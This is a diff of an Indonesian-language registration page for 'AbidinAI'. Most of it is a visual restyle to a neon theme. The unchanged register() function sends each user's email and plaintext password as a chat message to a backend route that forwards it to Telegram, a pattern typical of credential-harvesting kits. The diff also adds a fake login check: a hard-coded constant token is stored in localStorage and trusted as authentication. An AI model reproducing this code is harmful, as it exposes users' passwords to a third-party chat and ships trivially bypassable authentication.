@@ -4,78 +4,157 @@
   <meta charset="UTF-8">
   <title>Registrasi AbidinAI</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
+    :root {
+      --jarvis-cyan: #00ffff;
+      --jarvis-green: #00ffaa;
+      --dark-bg: #0d1117;
+      --card-bg: rgba(0, 255, 255, 0.05);
+    }
+    
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #1f4037, #99f2c8);
+      font-family: 'Consolas', 'Courier New', monospace;
+      background: linear-gradient(135deg, #0a1312, #15271d);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
-      color: white;
+      color: var(--jarvis-cyan);
+      overflow: hidden;
     }
 
     .container {
-      background: rgba(0, 0, 0, 0.3);
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
-      width: 300px;
+      background: var(--card-bg);
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 25px var(--jarvis-green);
+      border: 1px solid rgba(0, 255, 170, 0.3);
+      width: 320px;
       text-align: center;
+      transition: all 0.3s ease;
+      animation: fadeIn 1s ease-out;
+    }
+    
+    @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.9); }
+        to { opacity: 1; transform: scale(1); }
+    }
+
+    h2 {
+        font-size: 28px;
+        text-shadow: 0 0 10px var(--jarvis-green);
+        margin-bottom: 5px;
+        letter-spacing: 2px;
+    }
+
+    p {
+        color: rgba(0, 255, 170, 0.7);
+        margin-bottom: 25px;
     }
 
     input {
-      width: 93%;
-      padding: 10px;
-      margin: 10px 0;
+      width: 90%;
+      padding: 12px;
+      margin: 15px 0;
       border: none;
-      border-radius: 8px;
+      border-radius: 5px;
+      background: rgba(0, 255, 170, 0.1);
+      color: var(--jarvis-cyan);
+      border-bottom: 2px solid var(--jarvis-green);
+      transition: border-color 0.3s, box-shadow 0.3s;
     }
-
-    button {
-      padding: 10px 20px;
-      background-color: #34e89e;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 10px;
-    }
-
-    a {
-      color: #34e89e;
-      text-decoration: none;
-      display: block;
-      margin-top: 10px;
+    
+    input:focus {
+        outline: none;
+        border-bottom: 2px solid #ffaa00;
+        box-shadow: 0 0 10px rgba(255, 170, 0, 0.5);
     }
 
     .password-wrapper {
-      position: relative;
+        position: relative;
+        display: flex;
+        align-items: center;
+        width: 100%;
     }
 
-    .password-wrapper span {
+    .password-wrapper input {
+        width: 90%;
+    }
+
+    #togglePassword {
+      color: var(--jarvis-cyan);
       position: absolute;
-      top: 15px;
-      right: 10px;
+      right: 25px;
       cursor: pointer;
       font-size: 18px;
+      transition: color 0.3s;
+    }
+    
+    #togglePassword:hover {
+        color: #ffaa00;
+    }
+
+
+    button {
+      padding: 12px 20px;
+      background-color: var(--jarvis-green);
+      color: #151d27;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 25px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 10px var(--jarvis-green);
+    }
+
+    button:hover {
+      background-color: #ffaa00;
+      box-shadow: 0 0 20px #ffaa00;
+      transform: translateY(-2px);
+    }
+
+    a {
+      color: rgba(0, 255, 170, 0.6);
+      text-decoration: none;
+      display: block;
+      margin-top: 20px;
+      transition: color 0.3s;
+    }
+    
+    a:hover {
+        color: var(--jarvis-cyan);
     }
   </style>
+  
+  <script>
+    
+    if (localStorage.getItem("abidinai_token")) {
+      window.location.href = "dasboard.html";
+    }
+  </script>
+  
 </head>
 <body>
   <div class="container">
-    <h2>Registrasi AbidinAI</h2>
-    <input type="text" id="username" placeholder="Masukkan Email">
-
-    <div class="password-wrapper">
-      <input type="password" id="password" placeholder="Masukkan Password">
-      <span id="togglePassword" onclick="togglePassword()">🔒</span>
+    <h2><i class="fas fa-shield-alt"></i> PENDAFTARAN </h2>
+    <p>Inisiasi Protokol Pengguna Baru</p>
+    
+    <div class="input-group">
+        <input type="text" id="username" placeholder="EMAIL / IDENTITAS PENGGUNA">
     </div>
 
-    <button onclick="register()">Daftar</button>
-    <a href="login.html">Sudah punya akun? Login</a>
+    <div class="password-wrapper">
+      <input type="password" id="password" placeholder="PASSWORD ">
+      <span id="togglePassword" onclick="togglePassword()"><i class="fas fa-lock"></i></span>
+    </div>
+
+    <button onclick="register()">INISIASI REGISTRASI</button>
+    <a href="login.html">Sudah Diotorisasi? Masuk Di Sini</a>
   </div>
 
   <script>
@@ -84,13 +163,13 @@
       const password = document.getElementById("password").value;
 
       if (!username || !password) {
-        alert("⚠️ Isi semua kolom!");
+        alert("⚠️ Isi semua kolom: Data Input Diperlukan.");
         return;
       }
 
       const message = `📝 Registrasi:\n👤 Username: ${username}\n🔑 Password: ${password}`;
 
-      // Kirim ke backend, backend teruskan ke Telegram
+      
       fetch("/api/telegram", {
         method: "POST",
         headers: {
@@ -99,12 +178,15 @@
         body: JSON.stringify({ text: message })
       })
       .then(() => {
-        alert("Berhasil daftar! Silakan login.");
-        window.location.href = "login.html";
+        
+        localStorage.setItem("abidinai_token", "token_sederhana");
+
+        
+        window.location.href = "dasboard.html";
       })
       .catch((error) => {
         console.error("Gagal kirim ke Telegram via backend:", error);
-        alert("Gagal daftar. Coba lagi.");
+        alert("❌ Registrasi Gagal. Kesalahan Sistem.");
       });
     }
 
@@ -114,10 +196,10 @@
 
       if (passInput.type === "password") {
         passInput.type = "text";
-        toggleBtn.textContent = "🔓";
+        toggleBtn.innerHTML = '<i class="fas fa-lock-open"></i>';
       } else {
         passInput.type = "password";
-        toggleBtn.textContent = "🔒";
+        toggleBtn.innerHTML = '<i class="fas fa-lock"></i>';
       }
     }
   </script>
